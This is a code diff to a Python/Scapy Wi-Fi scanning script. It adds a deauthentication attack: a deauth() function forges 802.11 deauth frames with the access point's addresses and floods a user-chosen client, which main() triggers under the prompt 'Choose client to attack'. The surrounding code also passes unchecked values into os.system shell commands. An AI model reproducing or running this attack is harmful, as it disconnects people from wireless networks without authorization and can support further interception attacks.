@@ -53,6 +53,7 @@ def packetHandler(packet):
             
             ap_point_list = []
             ap_point_list.append(packet.addr2) # BSSID
+            ap_point_list.append(packet.addr3) 
             ap_point_list.append(packet.info) #append SSID
             ap_point_list.append(channel)
             AP_dict[index_AP_target] = ap_point_list
@@ -136,6 +137,15 @@ def changeChannelToAP(index : int) -> None:
     channel_target_converted = str(channel_target)
     os.system("sudo iwconfig " + interface + " channel " + channel_target_converted)
 
+def deauth(client_index) -> None:
+
+    print("client_index: ", client_index)
+    print("addr2: ", AP_target[0])
+    print("addr3: ", AP_target[1])
+
+    for y in range(1, 20): 
+        pkt = RadioTap()/Dot11(addr1=station_dict.get(client_index), addr2=AP_target[0], addr3=AP_target[1])/Dot11Deauth()
+        sendp(pkt, iface=interface, count=30, inter = .001) 
 
 def main():
     os.system("iwconfig") #to see our interfaces we have
@@ -188,6 +198,9 @@ def main():
     if len(AP_dict) == 0: # the clients dictionary is empty
         print("did not find any client")
         sys.exit() # end script
+
+    client_index = input("----- Choose client to attack -----")
+    deauth(client_index)
 
     changeToManagedMode(interface) # change back to default mode
 
